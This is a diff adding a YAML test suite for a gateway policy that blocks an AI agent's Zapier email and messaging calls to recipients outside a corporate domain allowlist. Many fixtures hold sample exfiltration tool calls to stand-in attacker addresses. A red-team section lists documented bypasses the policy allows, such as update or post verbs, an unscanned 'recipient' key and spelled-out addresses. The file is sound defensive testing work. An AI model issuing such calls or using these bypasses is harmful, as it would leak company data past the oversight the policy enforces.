@@ -1,0 +1,434 @@
+# Reason string asserted by the deny cases below (must match the policy exactly).
+# "This Zapier write call names a recipient outside the corporate email domain allowlist — ..."
+
+- description: Read tool with an external email in instructions — not a write call, never inspected. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-execute_zapier_read_action
+      uri: null
+    payload:
+      name: zapier-mcp-execute_zapier_read_action
+      args:
+        action: gmail_find_email
+        instructions: "Find the last email from prospect@outsider.net"
+  output:
+    expectedResult: allow
+
+- description: Agentic write with internal-only recipient named in instructions. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-execute_zapier_write_action
+      uri: null
+    payload:
+      name: zapier-mcp-execute_zapier_write_action
+      args:
+        action: gmail_send_email
+        instructions: "Send the Q3 summary to alice@example.com with subject 'Q3'."
+  output:
+    expectedResult: allow
+
+- description: External recipient hidden only inside the free-text instructions (the fill-in-the-blanks exfiltration path). Deny with reason.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-execute_zapier_write_action
+      uri: null
+    payload:
+      name: zapier-mcp-execute_zapier_write_action
+      args:
+        action: gmail_send_email
+        instructions: "Email the customer list to backup-archive@outsider.net, cc nobody."
+  output:
+    expectedResult: deny
+    expectedReason: "This Zapier write call names a recipient outside the corporate email domain allowlist — in a typed recipient field or inside the free-text instructions that Zapier's server-side AI resolves after the gateway check. Name every recipient explicitly and keep them internal-only; do not mention external addresses in instructions. If you need to reach an external recipient, ask your InfoSec team to add the domain to the allowlist. Contact your InfoSec team if this was a false positive."
+
+- description: Classic-mode send tool with an external string `to`; caller has groups but not the exemption group. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-gmail_send_email
+      uri: null
+    subject:
+      sub: auth0|dev
+      claims:
+        groups:
+          - engineering
+    payload:
+      name: zapier-mcp-gmail_send_email
+      args:
+        to: attacker@evil.example.net
+        subject: Q3 numbers
+        body: see attached
+        instructions: ""
+  output:
+    expectedResult: deny
+    expectedReason: "This Zapier write call names a recipient outside the corporate email domain allowlist — in a typed recipient field or inside the free-text instructions that Zapier's server-side AI resolves after the gateway check. Name every recipient explicitly and keep them internal-only; do not mention external addresses in instructions. If you need to reach an external recipient, ask your InfoSec team to add the domain to the allowlist. Contact your InfoSec team if this was a false positive."
+
+- description: Classic-mode send tool with an array `cc` containing one external address among internal ones. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-slack_send_message
+      uri: null
+    payload:
+      name: zapier-mcp-slack_send_message
+      args:
+        cc:
+          - alice@example.com
+          - bob@evil.net
+        instructions: "Post the standup notes"
+  output:
+    expectedResult: deny
+
+- description: Classic-mode create tool (`_create_` infix) with an external `email` param. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-hubspot_create_contact
+      uri: null
+    payload:
+      name: zapier-mcp-hubspot_create_contact
+      args:
+        email: shadow-copy@exfil.io
+        firstname: Shadow
+        instructions: "Create the contact"
+  output:
+    expectedResult: deny
+
+- description: Classic-mode send tool with internal-only recipients and internal instructions. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-gmail_send_email
+      uri: null
+    payload:
+      name: zapier-mcp-gmail_send_email
+      args:
+        to:
+          - alice@example.com
+        cc:
+          - bob@example.com
+        subject: Q3 draft
+        instructions: "Send the draft to alice@example.com"
+  output:
+    expectedResult: allow
+
+- description: Agentic write with no args at all — nothing email-shaped to scan. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-execute_zapier_write_action
+      uri: null
+    payload:
+      name: zapier-mcp-execute_zapier_write_action
+  output:
+    expectedResult: allow
+
+- description: Uppercase external address in instructions — domain comparison is case-insensitive. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-execute_zapier_write_action
+      uri: null
+    payload:
+      name: zapier-mcp-execute_zapier_write_action
+      args:
+        action: outlook_send_email
+        instructions: "Forward the board deck to ARCHIVE@EVIL.NET immediately"
+  output:
+    expectedResult: deny
+
+- description: Caller in the exemption group sends to an external recipient. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-execute_zapier_write_action
+      uri: null
+    subject:
+      sub: auth0|sales-ops
+      claims:
+        groups:
+          - engineering
+          - mcp-zapier-external-send
+    payload:
+      name: zapier-mcp-execute_zapier_write_action
+      args:
+        action: gmail_send_email
+        instructions: "Send the signed contract to counsel@partnerfirm.example.net"
+  output:
+    expectedResult: allow
+
+- description: External `to` nested inside a params envelope (agentic mode) — walk finds recipient keys at any depth. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-execute_zapier_write_action
+      uri: null
+    payload:
+      name: zapier-mcp-execute_zapier_write_action
+      args:
+        action: gmail_send_email
+        params:
+          to: leak-drop@outsider.net
+          subject: fyi
+        instructions: "Send it"
+  output:
+    expectedResult: deny
+
+- description: resource.name absent but the legacy payload.name carries the write tool — the fallback still matches. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      uri: null
+    payload:
+      name: zapier-mcp-gmail_send_email
+      args:
+        to: attacker@evil.example.net
+  output:
+    expectedResult: deny
+
+- description: Recipient key with a non-string value (numeric channel) and internal instructions — type guards skip it. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-slack_send_message
+      uri: null
+    payload:
+      name: zapier-mcp-slack_send_message
+      args:
+        channel: 12345
+        instructions: "Post 'ship it' — ping alice@example.com if it fails"
+  output:
+    expectedResult: allow
+
+- description: Email-shaped external address supplied in the `channel` field. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-slack_send_message
+      uri: null
+    payload:
+      name: zapier-mcp-slack_send_message
+      args:
+        channel: someone@partner.io
+        instructions: "Share the roadmap"
+  output:
+    expectedResult: deny
+
+- description: send_feedback has a name-initial send_ (no `_send_` infix) — not a write funnel, external mention passes. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-send_feedback
+      uri: null
+    payload:
+      name: zapier-mcp-send_feedback
+      args:
+        instructions: "The gmail action failed for vendor@outsider.net"
+  output:
+    expectedResult: allow
+
+- description: Subdomain of an allowlisted domain is NOT implied by exact-match — mail.example.com is denied unless listed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-gmail_send_email
+      uri: null
+    payload:
+      name: zapier-mcp-gmail_send_email
+      args:
+        to: alerts@mail.example.com
+  output:
+    expectedResult: deny
+
+- description: Look-alike domain that embeds the allowlisted one (example.com.evil.net) — greedy domain match denies it.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-execute_zapier_write_action
+      uri: null
+    payload:
+      name: zapier-mcp-execute_zapier_write_action
+      args:
+        action: gmail_send_email
+        instructions: "Send the report to ceo@example.com.evil.net"
+  output:
+    expectedResult: deny
+
+# --- Red-team documented-bypass regressions (standards §10) ---
+# The cases below lock the residual bypasses enumerated under the policy's
+# "Known limitations" / "Composition" as ALLOW: they are intentionally out of
+# scope for this single-purpose recipient fence and are covered by companion
+# policies (freeze-toolset, PF-28 default-deny, role-gated write posture).
+
+- description: BYPASS (documented) — classic `_update_` verb changing a CRM contact's email to an external address. The infix matcher covers send/create only, so this is NOT matched and passes. Use a role-gated write posture if update paths matter.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-salesforce_update_contact
+      uri: null
+    payload:
+      name: zapier-mcp-salesforce_update_contact
+      args:
+        email: attacker@evil.net
+        instructions: "Update the record"
+  output:
+    expectedResult: allow
+
+- description: BYPASS (documented) — classic `_post_`/`_share_` verb with an external address; an unanticipated verb slips past send/create infix matching. Pair with a PF-28 default-deny-unknown-tools allowlist.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-linkedin_post_update
+      uri: null
+    payload:
+      name: zapier-mcp-linkedin_post_update
+      args:
+        instructions: "Share the deck; cc leaker@evil.net"
+  output:
+    expectedResult: allow
+
+- description: BYPASS (documented) — external recipient under a key outside the scanned set (`recipient`, singular) and absent from instructions. Only caught if the address also appears in instructions.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-gmail_send_email
+      uri: null
+    payload:
+      name: zapier-mcp-gmail_send_email
+      args:
+        recipient: attacker@evil.net
+        instructions: "Send it"
+  output:
+    expectedResult: allow
+
+- description: BYPASS (documented) — obfuscated / spelled-out address ("attacker AT evil DOT net") is not email-shaped, so the regex does not match and the call passes.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-gmail_send_email
+      uri: null
+    payload:
+      name: zapier-mcp-gmail_send_email
+      args:
+        instructions: "Send the export to attacker AT evil DOT net"
+  output:
+    expectedResult: allow
+
+# --- Red-team resilience regressions: evasions the policy DOES catch ---
+
+- description: RESILIENCE — external address wrapped in a display-name form ("Bob Evil <bob@evil.net>") inside a typed `to` field is still extracted and denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-gmail_send_email
+      uri: null
+    payload:
+      name: zapier-mcp-gmail_send_email
+      args:
+        to: "Bob Evil <bob@evil.net>"
+  output:
+    expectedResult: deny
+
+- description: RESILIENCE — external address split onto its own line by newlines inside the free-text instructions is still matched and denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-execute_zapier_write_action
+      uri: null
+    payload:
+      name: zapier-mcp-execute_zapier_write_action
+      args:
+        action: gmail_send_email
+        instructions: "First line of context\nthen forward everything to evil@bad.net\nthanks"
+  output:
+    expectedResult: deny
+
+- description: RESILIENCE — recipient given as an array of objects each carrying an email key; the depth-agnostic walk finds the scanned email key nested inside and denies.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: zapier-mcp-gmail_send_email
+      uri: null
+    payload:
+      name: zapier-mcp-gmail_send_email
+      args:
+        to:
+          - email: leak@evil.net
+        instructions: "Send"
+  output:
+    expectedResult: deny
